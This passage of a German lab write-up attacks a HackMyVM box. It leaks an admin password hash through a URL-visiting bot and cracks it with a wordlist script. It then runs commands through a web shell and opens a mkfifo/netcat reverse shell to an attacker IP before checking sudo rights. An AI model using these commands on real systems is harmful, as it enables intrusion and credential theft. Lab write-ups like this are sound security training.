<p class="analysis">**Analyse:** Der Befehl `git show --name-only b409ae5` zeigt Informationen über den Git-Commit mit dem (gekürzten) Hash `b409ae5` an. Die Option `--name-only` bewirkt, dass nur die Namen der in diesem Commit geänderten Dateien aufgelistet werden, nicht der gesamte Diff.
Der Commit wurde von "akaRed" erstellt und hat die Commit-Nachricht "add some file". Die aufgelisteten Dateien sind `.htaccess`, `.test.php.swp`, `ctf.conf`, `index.php` und `nginx.conf`. Dies sind genau die Dateien, die wir zuvor im `gitdump_output`-Verzeichnis gesehen haben.</p>
<p class="evaluation">**Bewertung:** Dieser Commit scheint der initiale oder ein sehr früher Commit zu sein, der die Hauptdateien des Projekts hinzugefügt hat, einschließlich der problematischen `.test.php.swp`. Die Information über den Autor "akaRed" könnte ein Benutzername sein, der auf dem System existiert. Das Datum des Commits (Mon Apr 21 01:24:04 2025) gibt einen zeitlichen Kontext.</p>
<p class="recommendation">**Empfehlung (Pentester):** Analysiere weitere Commits mit `git log`, um die Entwicklung der Anwendung nachzuvollziehen. Es ist möglich, dass in früheren Commits sensible Informationen enthalten waren, die später entfernt wurden. Der Benutzername "akaRed" sollte für spätere Phasen des Angriffs (z.B. Brute-Force-Versuche, Suche nach Home-Verzeichnissen) im Hinterkopf behalten werden.<br>**Empfehlung (Admin):** Commit-Nachrichten sollten aussagekräftiger sein als "add some file", um die Nachvollziehbarkeit von Änderungen zu verbessern. Stellen Sie sicher, dass keine sensiblen Dateien oder temporären Dateien wie `.swp`-Dateien in das Repository committet werden. Verwenden Sie `.gitignore`-Dateien effektiv.</p>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
<p class="comment">Basierend auf der Analyse der `.test.php.swp`-Datei versuchen wir nun, die dort enthüllte Bot-Funktionalität auszunutzen, um an sensible Informationen zu gelangen. Der Code deutete an, dass der Bot URLs als 'admin' besucht, die über einen `uri`-Parameter gesteuert werden. Wir vermuten, dass die Endpunkte `/visit` zum Triggern des Bots und `/log` zum Abrufen der Bot-Logs dienen.</p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">curl -X POST \ 
     -d "uri=passwd" http://noports.hmv/visit</span>
        </div>
        <pre>
<span class="command">{"message":"Bot is visiting: passwd"}</span>   
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Mit `curl` wird eine POST-Anfrage an `http://noports.hmv/visit` gesendet.
- `-X POST`: Spezifiziert die HTTP-Methode als POST.
- `-d "uri=passwd"`: Sendet die Daten `uri=passwd` im Request-Body. Dies zielt darauf ab, den `uri`-Parameter der `bot_runner`-Funktion (aus `.test.php.swp`) auf den Wert "passwd" zu setzen.
Die Antwort des Servers ist `{"message":"Bot is visiting: passwd"}`, was darauf hindeutet, dass der Request erfolgreich war und der Bot angewiesen wurde, die (relative) URI "passwd" zu besuchen.</p>
<p class="evaluation">**Bewertung:** Dies ist ein vielversprechender erster Schritt zur Ausnutzung der Bot-Funktionalität. Die Bestätigung zeigt, dass der `/visit`-Endpunkt existiert und auf unsere Eingabe reagiert. Wir wissen noch nicht, was der Bot unter der URI "passwd" findet, aber die Interaktion funktioniert.</p>
<p class="recommendation">**Empfehlung (Pentester):** Als Nächstes müssen die Bot-Logs überprüft werden (vermutlich über den `/log`-Endpunkt), um zu sehen, welches Ergebnis der Besuch der "passwd"-URI durch den Bot hatte. Versuchen Sie, andere potenziell interessante URIs zu übergeben (z.B. Dateinamen, interne Endpunkte, Konfigurationsdateien).<br>**Empfehlung (Admin):** Endpunkte, die interne Aktionen triggern (wie das Besuchen von URLs durch einen Bot), müssen streng abgesichert und validiert werden. Eine reine Bestätigungsnachricht ohne Fehlerbehandlung oder Ergebnisrückgabe im selben Request ist oft ein Zeichen für eine asynchrone Verarbeitung, deren Ergebnisse an anderer Stelle (hier: Logs) eingesehen werden müssen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">curl -X POST http://noports.hmv/log</span>
        </div>
        <pre>
<span class="command">[2025-05-20 23:30:47] Bot visited passwd, response: {"error":"No match"}</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Eine POST-Anfrage wird an `http://noports.hmv/log` gesendet, um die Log-Einträge des Bots abzurufen. Die Antwort enthält einen Log-Eintrag, der bestätigt, dass der Bot die URI "passwd" besucht hat. Die Antwort des internen Aufrufs durch den Bot war jedoch `{"error":"No match"}`. Dies bedeutet, dass die Ressource unter der (relativen) URI "passwd" entweder nicht existiert oder keinen relevanten Inhalt für den Bot geliefert hat.</p>
<p class="evaluation">**Bewertung:** Obwohl der erste Versuch, "passwd" abzurufen, nicht direkt erfolgreich war, haben wir die Funktionsweise des Loggings bestätigt. Wir können jetzt iterativ verschiedene URIs testen und die Ergebnisse in den Logs einsehen. Die Fehlermeldung `{"error":"No match"}` ist spezifisch und deutet darauf hin, dass der Bot eine Art von erwartetem Muster oder Inhalt nicht gefunden hat.</p>
<p class="recommendation">**Empfehlung (Pentester):** Testen Sie weitere URIs. Da wir aus der `.test.php.swp`-Datei wissen, dass der Bot als 'admin' agiert und einen Login-Prozess durchläuft, könnten URIs interessant sein, die typischerweise Admin-Informationen enthalten, wie z.B. "profile", "admin", "config", "users" etc. Es könnte auch versucht werden, Pfade zu bekannten Dateien (z.B. `/etc/passwd` als `uri=../../../etc/passwd`, falls eine LFI-Schwachstelle vorliegt und der Bot Dateipfade interpretieren kann) zu testen, obwohl die aktuelle Ausgabe eher auf das Abrufen von Web-Endpunkten hindeutet.<br>**Empfehlung (Admin):** Log-Dateien sollten nicht ohne Authentifizierung öffentlich zugänglich sein, besonders wenn sie detaillierte Informationen über interne Prozesse oder Fehler enthalten. Die Fehlermeldungen sollten generisch gehalten werden, um Angreifern keine unnötigen Details zu liefern.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">curl -X POST \                      
     -d "uri=hacker" http://noports.hmv/visit</span>
        </div>
        <pre>
<span class="command">{"message":"Bot is visiting: hacker"}</span>  
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Ein weiterer Versuch, den Bot zu triggern. Dieses Mal wird die URI "hacker" an den `/visit`-Endpunkt gesendet. Die Antwort `{"message":"Bot is visiting: hacker"}` bestätigt erneut, dass der Bot die Anweisung erhalten hat.</p>
<p class="evaluation">**Bewertung:** Konsistentes Verhalten des `/visit`-Endpunkts. Wir fahren mit dem Testen verschiedener URIs fort.</p>
<p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Logs, um das Ergebnis des Besuchs von "hacker" zu sehen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen bezüglich der Absicherung von internen Endpunkten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">curl -X POST \ 
     -d "uri=profile" http://noports.hmv/visit</span>
        </div>
        <pre>
<span class="command">{"message":"Bot is visiting: profile"}</span>        
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Die URI "profile" wird an den `/visit`-Endpunkt gesendet. Die Antwort `{"message":"Bot is visiting: profile"}` bestätigt die Anweisung an den Bot.</p>
<p class="evaluation">**Bewertung:** Dies ist ein vielversprechender Versuch, da "profile" oft eine Seite ist, die Benutzerinformationen enthält, insbesondere wenn der Bot als Admin agiert.</p>
<p class="recommendation">**Empfehlung (Pentester):** Dringend die Logs überprüfen, um das Ergebnis des Besuchs von "profile" zu sehen.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlungen.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/gitdump_output/.git/refs/heads]
└─# <span class="command">curl -X POST http://noports.hmv/log</span>
        </div>
        <pre>
<span class="command">[2025-05-20 23:30:47] Bot visited passwd, response: {"error":"No match"}</span>
<span class="command">[2025-05-20 23:33:58] Bot visited hacker, response: {"error":"No match"}</span>
<span class="password">[2025-05-20 23:36:02] Bot visited profile, response: {"id":1,"username":"admin","email":"admin@example.com","password":"6f06ee724b86fca512018ad692a62aedc</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Die Logs werden erneut über den `/log`-Endpunkt abgerufen. Die Ausgabe enthält nun die Ergebnisse aller bisherigen Versuche:
- Der Besuch von "passwd" und "hacker" führte zu `{"error":"No match"}`.
- Der Besuch von "profile" lieferte jedoch eine JSON-Antwort: `{"id":1,"username":"admin","email":"admin@example.com","password":"6f06ee724b86fca512018ad692a62aedc"}`.
Dies ist ein Volltreffer! Die Antwort enthält den Benutzernamen 'admin', eine E-Mail-Adresse und vor allem einen Passwort-Hash: `6f06ee724b86fca512018ad692a62aedc`.</p>
<p class="evaluation">**Bewertung:** Fantastisch! Wir haben erfolgreich sensible Informationen des Admin-Benutzers, einschließlich seines Passwort-Hashes, durch die Ausnutzung der Bot-Funktionalität extrahiert. Dies ist ein kritischer Informations-Leak. Der Hash muss nun versucht werden zu knacken.</p>
<p class="recommendation">**Empfehlung (Pentester):** Der nächste Schritt ist, den extrahierten Hash `6f06ee724b86fca512018ad692a62aedc` zu identifizieren (z.B. mit Hash-Identifier-Tools) und dann zu versuchen, ihn mit Werkzeugen wie Hashcat oder John the Ripper und gängigen Wortlisten (wie `rockyou.txt`) zu knacken. Das Skript `crackhash.py`, das im weiteren Verlauf erstellt wird, deutet darauf hin, dass der Hash bereits als der zu suchende Hash (`seek_hash`) bekannt war oder hier wiedererkannt wird.<br>**Empfehlung (Admin):** Das Exponieren von Passwort-Hashes über interne oder externe Endpunkte ist eine schwere Sicherheitslücke. APIs und interne Funktionen sollten niemals sensible Daten wie Passwort-Hashes in Klartext oder leicht abrufbaren Formaten zurückgeben. Starke Hashing-Algorithmen mit Salt sollten verwendet werden. Die Bot-Funktionalität muss dringend überarbeitet und gesichert werden, um solche Leaks zu verhindern. Der `/log`-Endpunkt muss ebenfalls abgesichert werden.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/Hackingtools/git-dumper]
└─# <span class="command">vi crackhash.py</span>
        </div>
        <pre>
import hashlib, sys
seek_hash = "6f06ee724b86fca512018ad692a62aedc"
path_wl = r"C:\Users\DarkSpirit\Desktop\Neue Downloads\15. Gemeinsam\2. wordlists\wordlists_13.09.2024\rockyou.txt"

for line in open(path_wl, 'r', errors='ignore'):
    word = line.strip()
    if not word: continue
    for name, algo_func in [("md5", hashlib.md5), ("sha1", hashlib.sha1), ("sha256", hashlib.sha256)]:
        curr_hash = algo_func(word.encode()).hexdigest()
        if curr_hash.startswith(seek_hash):
            print(f"[*] Passwort gefunden: {word} {name} {curr_hash}")
            sys.exit()
print("Kein Erfolg!")
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Pentester erstellt mit `vi` (einem Texteditor) ein Python-Skript namens `crackhash.py`. Das Skript ist dafür konzipiert, einen gegebenen Hash-Präfix (`seek_hash`) zu knacken, indem es Wörter aus einer Wortliste (`path_wl` zeigt auf eine lokale `rockyou.txt`) mit verschiedenen Algorithmen (MD5, SHA1, SHA256) hasht und vergleicht. Der `seek_hash` ist exakt der Hash, den wir zuvor aus den Bot-Logs für den Admin-Benutzer extrahiert haben. Der Pfad zur Wortliste ist ein Windows-Pfad, was darauf hindeutet, dass dieser Teil des Cracking-Prozesses möglicherweise auf der lokalen Maschine des Pentesters und nicht auf dem Kali-System durchgeführt wird oder die Wortliste an einem unüblichen Ort auf dem Kali-System liegt.</p>
<p class="evaluation">**Bewertung:** Das Erstellen eines benutzerdefinierten Skripts zum Hashen ist ein gängiger Ansatz, besonders wenn man schnell verschiedene Algorithmen testen möchte oder spezialisierte Tools nicht sofort zur Hand hat. Die Wahl der Algorithmen (MD5, SHA1, SHA256) deckt gängige, wenn auch teilweise veraltete, Hashing-Verfahren ab.</p>
<p class="recommendation">**Empfehlung (Pentester):** Führen Sie das Skript aus, um zu versuchen, den Hash zu knacken. Wenn das Skript nicht erfolgreich ist, könnten leistungsstärkere Tools wie Hashcat oder John the Ripper mit erweiterten Regeln und größeren Wortlisten oder spezialisierten Masken verwendet werden. Die Identifizierung des genauen Hash-Typs (z.B. mit `hashid`) wäre auch hilfreich, obwohl das Skript bereits die gängigsten abdeckt.<br>**Empfehlung (Admin):** Dies demonstriert, wie exponierte Hashes angegriffen werden können. Verwenden Sie immer starke, gesaltete Hashing-Algorithmen (z.B. Argon2, bcrypt, scrypt). Die Länge und Komplexität von Passwörtern ist entscheidend, um Brute-Force-Angriffe zu erschweren, selbst wenn der Hash exponiert wird.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(pwn)─(root㉿CCat)-[~/Hackingtools/git-dumper]
└─# <span class="command">python3 crackhash.py</span>
        </div>
        <pre>
...
..

<span class="password">[+] shredder1 sha256 6f06ee724b86fca512018ad692a62aedc6c49c58af0b272eeb859d525a9d406c</span>

Login = <span class="password">admin:shredder1</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Das Python-Skript `crackhash.py` wird ausgeführt. Nach einiger Zeit (angedeutet durch `... ..`) findet das Skript eine Übereinstimmung. Das Wort `shredder1` ergibt, mit SHA256 gehasht, einen Hash, der mit dem gesuchten `seek_hash` (`6f06ee724b86fca512018ad692a62aedc...`) beginnt. Der vollständige SHA256-Hash für `shredder1` wird ebenfalls angezeigt. Daraus schließt der Pentester, dass die Anmeldeinformationen `admin:shredder1` lauten.</p>
<p class="evaluation">**Bewertung:** Ein herausragender Erfolg! Das Passwort für den Admin-Account wurde erfolgreich geknackt. Wir haben nun gültige Zugangsdaten. Dies öffnet die Tür für den initialen Zugriff auf die Anwendung oder das System, falls diese Anmeldedaten an anderer Stelle wiederverwendet werden oder ein Admin-Login-Panel existiert.</p>
<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, sich mit den Anmeldeinformationen `admin:shredder1` an allen bekannten Login-Schnittstellen anzumelden (z.B. Web-Login, SSH, falls es einen Benutzer 'admin' gibt). Suchen Sie nach einer Admin-Oberfläche oder Funktionen, die nun zugänglich sind. Die Information `PHPSESSID` aus der `.test.php.swp` deutet auf eine Webanwendung hin, wahrscheinlich mit einem Login-Formular.<br>**Empfehlung (Admin):** Das Passwort "shredder1" ist relativ schwach und in gängigen Wortlisten enthalten. Dies unterstreicht die Notwendigkeit, starke, einzigartige Passwörter zu verwenden und regelmäßige Passwort-Audits durchzuführen. Multi-Faktor-Authentifizierung (MFA) hätte hier einen erfolgreichen Login auch mit kompromittierten Anmeldeinformationen erschwert oder verhindert.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=gff9hr3f31mil453k0gervcvn6" \
     --data-urlencode "command=cat /etc/nginx/nginx.conf" \
     http://noports.hmv/sh3ll.php</span>
        </div>
        <pre>
 
worker_processes auto;
pcre_jit on;
error_log /var/log/nginx/error.log warn;
include /etc/nginx/modules/*.conf;


events {
	# The maximum number of simultaneous connections that can be opened by
	# a worker process.
	worker_connections 1024;
}
http {
        proxy_cache_path /tmp keys_zone=cache:10m max_size=1g inactive=60m use_temp_path=off;
	# Includes mapping of file name extensions to MIME types of responses
	# and defines the default type.
	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	# Name servers used to resolve names of upstream servers into addresses.
	# It's also needed when using tcpsocket and udpsocket in Lua modules.
	#resolver 208.67.222.222 208.67.220.220;

	# Don't tell nginx version to clients.
	server_tokens off;

	# Specifies the maximum accepted body size of a client request, as
	# indicated by the request header Content-Length. If the stated content
	# length is greater than this size, then the client receives the HTTP
	# error code 413. Set to 0 to disable.
	client_max_body_size 1m;

	# Timeout for keep-alive connections. Server will close connections after
	# this time.
	keepalive_timeout 65;

	# Sendfile copies data between one FD and other from within the kernel,
	# which is more efficient than read() + write().
	sendfile on;

	# Don't buffer data-sends (disable Nagle algorithm).
	# Good for sending frequent small bursts of data in real time.
	tcp_nodelay on;

	# Causes nginx to attempt to send its HTTP response head in one packet,
	# instead of using partial frames.
	#tcp_nopush on;


	# Path of the file with Diffie-Hellman parameters for EDH ciphers.
	#ssl_dhparam /etc/ssl/nginx/dh2048.pem;

	# Specifies that our cipher suits should be preferred over client ciphers.
	ssl_prefer_server_ciphers on;

	# Enables a shared SSL cache with size that can hold around 8000 sessions.
	ssl_session_cache shared:SSL:2m;


	# Enable gzipping of responses.
	#gzip on;

	# Set the Vary HTTP header as defined in the RFC 2616.
	gzip_vary on;

	# Enable checking the existence of precompressed files.
	#gzip_static on;
	# Specifies the main log format.
	log_format main '$remote_addr - $remote_user [$time_local] "$request" '
			'$status $body_bytes_sent "$http_referer" '
			'"$http_user_agent" "$http_x_forwarded_for"';

	# Sets the path, format, and configuration for a buffered log write.
	access_log /var/log/nginx/access.log main;
	# Includes virtual hosts configs.
	include /etc/nginx/conf.d/*.conf;
}
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Mit `curl` wird eine POST-Anfrage an `http://noports.hmv/sh3ll.php` gesendet.
- `-b "PHPSESSID=gff9hr3f31mil453k0gervcvn6"`: Setzt ein Cookie. Diese PHPSESSID wurde vermutlich aus einem vorherigen erfolgreichen Login (z.B. mit den `admin:shredder1` Credentials über ein Webformular, das hier nicht gezeigt wird, oder sie wurde anderweitig erlangt) oder es wird eine geratene/vorherige Session ID verwendet.
- `--data-urlencode "command=cat /etc/nginx/nginx.conf"`: Sendet den URL-encodeten Befehl `cat /etc/nginx/nginx.conf` als Parameter `command`.
Dies deutet stark darauf hin, dass `sh3ll.php` eine Webshell ist, die Systembefehle entgegennimmt und ausführt. Die Ausgabe ist der Inhalt der Datei `/etc/nginx/nginx.conf`. Dies ist die Hauptkonfigurationsdatei des Nginx-Webservers.</p>
<p class="evaluation">**Bewertung:** Wir haben nun Remote Code Execution (RCE) auf dem Server über die Webshell `sh3ll.php` erlangt! Dies ist ein kritischer Zustand. Der Zugriff auf die `nginx.conf` liefert detaillierte Informationen über die Konfiguration des Webservers, die für weitere Angriffe oder zur Eskalation von Rechten nützlich sein können. Die Verwendung eines Cookies deutet darauf hin, dass die Webshell möglicherweise eine Authentifizierung oder ein Session-Management besitzt.</p>
<p class="recommendation">**Empfehlung (Pentester):** Führen Sie weitere Befehle über die Webshell aus, um das System zu enumerieren. Ein wichtiger erster Befehl ist `id`, um herauszufinden, mit welchen Benutzerrechten die Webshell ausgeführt wird. Versuchen Sie, eine interaktive Reverse Shell zu etablieren, um komfortabler arbeiten zu können.<br>**Empfehlung (Admin):** Webshells wie `sh3ll.php` sind ein klares Zeichen einer Kompromittierung und müssen sofort entfernt werden. Die Ursache für das Hochladen/Erstellen der Webshell muss gefunden und behoben werden (z.B. eine Schwachstelle in einer Webanwendung, kompromittierte Zugangsdaten). Überwachen Sie das System auf verdächtige PHP-Dateien oder andere Skripte im Web-Root. Härten Sie die PHP-Konfiguration, um die Ausführung gefährlicher Funktionen einzuschränken.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=gff9hr3f31mil453k0gervcvn6" \
     --data-urlencode "command=id" \
     http://noports.hmv/sh3ll.php -s| grep pre</span>
        </div>
        <pre>
     <span class="command">uid=101(apache) gid=102(apache) groups=82(www-data),102(apache),102(apache)</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Befehl `id` wird über die Webshell `sh3ll.php` ausgeführt. Die Option `-s` bei `curl` unterdrückt die Fortschrittsanzeige, und `| grep pre` filtert die Ausgabe (obwohl es hier nicht ideal passt, da "pre" nicht direkt in der `id`-Ausgabe vorkommt; wahrscheinlich wurde es von einem vorherigen Befehl kopiert und nicht angepasst, oder der Pentester erwartete eine HTML-formatierte Ausgabe, die `
 -Tags enthält).
Die relevante Ausgabe ist `uid=101(apache) gid=102(apache) groups=82(www-data),102(apache),102(apache)`. Dies zeigt, dass die Webshell und somit die ausgeführten Befehle im Kontext des Benutzers `apache` (UID 101) ausgeführt werden. Dieser Benutzer gehört auch zur Gruppe `www-data`.
<p class="evaluation">**Bewertung:** Wir haben nun bestätigt, dass wir als Benutzer `apache` Code auf dem System ausführen können. Dies ist typisch für Webshells, die im Kontext des Webserver-Prozesses laufen. Die Rechte sind noch eingeschränkt, aber es ist ein solider erster Zugriff (Initial Foothold).</p>
<p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, von dieser nicht-interaktiven Webshell zu einer interaktiven Reverse Shell zu gelangen, um die weitere Enumeration und Privilegienerweiterung zu erleichtern. Suchen Sie nach Möglichkeiten zur Privilegienerweiterung vom `apache`-Benutzer aus (z.B. SUID-Binaries, Cronjobs, Kernel-Exploits, falsch konfigurierte sudo-Rechte).<br>**Empfehlung (Admin):** Der Webserver-Prozess (`apache`) sollte mit minimal notwendigen Rechten laufen (Principle of Least Privilege). Der Zugriff auf Systemressourcen sollte stark eingeschränkt sein. Überwachen Sie die Aktivitäten des `apache`-Benutzers genau.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -X POST \
     -b "PHPSESSID=igv9sjpk6ek8cuf3k9mj6jef2p" \
     --data-urlencode "command=rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/ash -i 2>&1 | nc 192.168.2.199 80 > /tmp/f" \
     http://noports.hmv/sh3ll.php</span>
        </div>
        <pre></pre>
    </div>
</div>
<p class="analysis">**Analyse:** Dieser `curl`-Befehl sendet einen komplexeren Payload an die Webshell `sh3ll.php`, um eine Reverse Shell zu etablieren.
- Die `PHPSESSID` hat sich geändert (`igv9sjpk6ek8cuf3k9mj6jef2p`), was auf eine neue Session oder einen anderen erfolgreichen Login hindeuten könnte.
- Der `command`-Parameter enthält eine Befehlskette:
    - `rm -f /tmp/f`: Löscht eine eventuell vorhandene Datei `/tmp/f`.
    - `mkfifo /tmp/f`: Erstellt eine Named Pipe (FIFO) namens `/tmp/f`.
    - `cat /tmp/f | /bin/ash -i 2>&1 | nc 192.168.2.199 80 > /tmp/f`: Dies ist der Kern der Reverse Shell:
        - `cat /tmp/f`: Liest von der Named Pipe.
        - `| /bin/ash -i 2>&1`: Leitet die Ausgabe von `cat` an eine interaktive Alpine Shell (`ash -i`). Standard-Error (`2`) wird in Standard-Output (`1`) umgeleitet (`2>&1`).
        - `| nc 192.168.2.199 80`: Die Ausgabe der Shell (und die Eingabe für die Shell) wird über `nc` (Netcat) an den Angreifer-Host `192.168.2.199` auf Port `80` gesendet/empfangen.
        - `> /tmp/f`: Die Eingabe, die von Netcat kommt (Befehle vom Angreifer), wird wieder in die Named Pipe geschrieben, von wo `cat` sie liest und an die Shell weitergibt.
Die Webshell gibt keine direkte Ausgabe zurück, da der Befehl im Hintergrund eine Verbindung aufbaut.</p>
<p class="evaluation">**Bewertung:** Dies ist ein klassischer und effektiver Weg, um eine Reverse Shell von einem kompromittierten System zu erhalten, besonders wenn nur eine <br>
nicht-interaktive Webshell zur Verfügung steht. <br>
Der Erfolg hängt davon ab, ob auf dem Zielsystem `nc` und `mkfifo` verfügbar sind und ob ausgehende Verbindungen zu Port 80 des Angreifer-Hosts erlaubt sind.</p>
<p class="recommendation">**Empfehlung (Pentester):** Auf der Angreifer-Maschine (`192.168.2.199`) muss ein Netcat-Listener auf Port `80` gestartet werden (`nc -lvnp 80`), <br>
*bevor* dieser `curl`-Befehl ausgeführt wird, um die eingehende Verbindung entgegenzunehmen.<br>

**Empfehlung (Admin):** Systeme sollten so konfiguriert werden, dass ausgehende Verbindungen nur zu explizit erlaubten <br>
Zielen und Ports möglich sind (Egress Filtering). Die Verfügbarkeit von Tools wie `nc` auf Produktivservern sollte überdacht werden,<br>
 wenn sie nicht zwingend für den Betrieb benötigt werden. Die Überwachung von Prozessstarts und Netzwerkverbindungen kann helfen, <br>
 solche Aktivitäten zu erkennen.</p>
        </section>

        <section id="proof-of-concept-initial">
            <h2>Proof of Concept (Initial Shell als apache)</h2>
            <p class="comment">Dieser Abschnitt demonstriert die erfolgreiche Erlangung einer interaktiven Shell auf dem Zielsystem im Kontext des `apache`-Benutzers. Dies wurde durch die Ausnutzung der zuvor identifizierten Webshell `sh3ll.php` und das Etablieren einer Reverse Shell erreicht.</p>
            <p class="analysis">**Kurzbeschreibung:** Die Webshell `sh3ll.php` erlaubte die Ausführung beliebiger Systembefehle. Durch einen speziell präparierten Befehl wurde eine Named Pipe erstellt und Netcat verwendet, um eine interaktive `/bin/ash`-Shell an den Angreifer-Host umzuleiten.</p>
            <p class="evaluation">**Voraussetzungen:**
                <ul>
                    <li>Zugriff auf die Webshell `sh3ll.php` (z.B. durch Kenntnis einer gültigen `PHPSESSID`).</li>
                    <li>Verfügbarkeit von `mkfifo`, `cat`, `/bin/ash` und `nc` auf dem Zielsystem.</li>
                    <li>Möglichkeit des Zielsystems, ausgehende Verbindungen zum Angreifer-Host auf dem gewählten Port (hier Port 80) herzustellen.</li>
                    <li>Ein laufender Netcat-Listener auf dem Angreifer-Host.</li>
                </ul>
            </p>
            <p class="recommendation">**Schritt-für-Schritt-Anleitung:**
                <ol>
                    <li>Auf dem Angreifer-Host (192.168.2.199) wird ein Netcat-Listener gestartet: `nc -lvnp 80`.</li>
                    <li>Der `curl`-Befehl (siehe vorheriger Log-Eintrag) wird ausgeführt, um die Reverse-Shell-Payload an `sh3ll.php` zu senden.</li>
                    <li>Die Verbindung wird vom Zielsystem zum Listener des Angreifers aufgebaut.</li>
                </ol>
            </p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">nc -lvnp 80</span>
        </div>
        <pre>
<span class="password">listening on [any] 80 ...</span>
<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.196] 44811</span>
<span class="password">/bin/ash: can't access tty; job control turned off</span>
<span class="command">/var/www/localhost/htdocs $</span> 
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** Der Netcat-Befehl `nc -lvnp 80` startet einen Listener auf dem Angreifer-System.
- `-l`: Listen-Modus.
- `-v`: Verbose-Modus für mehr Ausgabe.
- `-n`: Numerische IP-Adressen (kein DNS).
- `-p 80`: Lauscht auf Port 80.
Kurz darauf wird eine Verbindung vom Zielsystem (`192.168.2.196` – diese IP ist neu, vorher war es `.200`, dies könnte ein NAT-Gateway oder eine andere Netzwerkschnittstelle auf dem Ziel sein) zum Listener aufgebaut. Die Meldung `/bin/ash: can't access tty; job control turned off` ist typisch für einfache Reverse Shells, die keine vollwertige TTY (Pseudo-Terminal) bereitstellen. Wir erhalten jedoch einen Shell-Prompt `/var/www/localhost/htdocs $`, der anzeigt, dass wir nun eine interaktive Shell als der Benutzer haben, unter dem der Webserver (und somit die Reverse Shell) läuft – in diesem Fall `apache`.</p>
<p class="evaluation">**Erwartetes Ergebnis & Beweismittel:** Fantastisch! Das erwartete Ergebnis, eine interaktive Shell auf dem Zielsystem zu erhalten, wurde erreicht. Der Shell-Prompt `/var/www/localhost/htdocs $` ist der Beweis. Wir haben nun einen stabilen initialen Zugriff auf das System.</p>
<p class="recommendation">**Risikobewertung:** Der erfolgreiche Initial Access als `apache`-Benutzer bedeutet, dass ein Angreifer nun direkten Zugriff auf die Dateien der Webanwendung hat, Konfigurationsdateien lesen, potenziell Daten manipulieren und das System als Ausgangspunkt für weitere Angriffe im Netzwerk oder zur Privilegienerweiterung auf dem kompromittierten Host nutzen kann. Das Risiko ist als Hoch einzustufen.</p>
        </section>

        <section id="privilege-escalation">
            <h2>Privilege Escalation</h2>
<p class="comment">Nachdem wir initialen Zugriff als Benutzer `apache` erlangt haben, ist das nächste Ziel die Privilegienerweiterung (Privilege Escalation), um Root-Rechte auf dem System zu erhalten.</p>
<div class="code-block">
    <div class="terminal">
        <div class="prompt">/var/www/localhost/htdocs $ <span class="command">sudo -l</span>
        </div>
        <pre>
User apache may run the following commands on noport:
    <span class="password">(root) NOPASSWD: /sbin/reboot</span>
</pre>
    </div>
</div>
<p class="analysis">**Analyse:** In der Reverse Shell wird der Befehl `sudo -l` ausgeführt. Dieser Befehl listet auf, welche Befehle der aktuelle Benutzer (`apache`) mit `sudo` (also mit Root-Rechten) ausführen darf. Die Ausgabe zeigt, dass der Benutzer `apache` den Befehl `/sbin/reboot` ohne Passwort (`NOPASSWD`) als Root ausführen darf.</p>
<p class="evaluation">**Bewertung:** Dies ist eine interessante, aber nicht direkt für eine Shell-Eskalation nützliche `sudo`-Regel. Die Möglichkeit, das System neuzustarten, könnte für einen Denial-of-Service-Angriff verwendet werden, aber nicht unmittelbar, um Root-Rechte zu erlangen. Es könnte jedoch in Kombination mit anderen Faktoren relevant werden (z.B. wenn beim Bootvorgang bestimmte Skripte mit Root-Rechten ausgeführt werden, die wir beeinflussen können).</p>
<p class="recommendation">**Empfehlung (Pentester):** Behalten Sie diese `sudo`-Regel im Hinterkopf. Untersuchen Sie den Boot-Prozess und Start-Skripte des Systems. Könnten Konfigurationsdateien, die beim Start gelesen werden (z.B. von Nginx, wie in der `readme` angedeutet), manipuliert werden, um beim nächsten Reboot Code als Root auszuführen? Suchen Sie parallel nach anderen Wegen zur Privilegienerweiterung.<br>**Empfehlung (Admin):** Die Vergabe von `sudo`-Rechten sollte extrem restriktiv erfolgen. Das Recht, `reboot` auszuführen, sollte nur absolut notwendigen Benutzern oder Prozessen gewährt werden. Wenn es für einen automatisierten Prozess benötigt wird, stellen Sie sicher, dass dieser Prozess nicht von einem niedrig privilegierten Benutzer manipuliert werden kann.</p>

<div class="code-block">
    <div class="terminal">
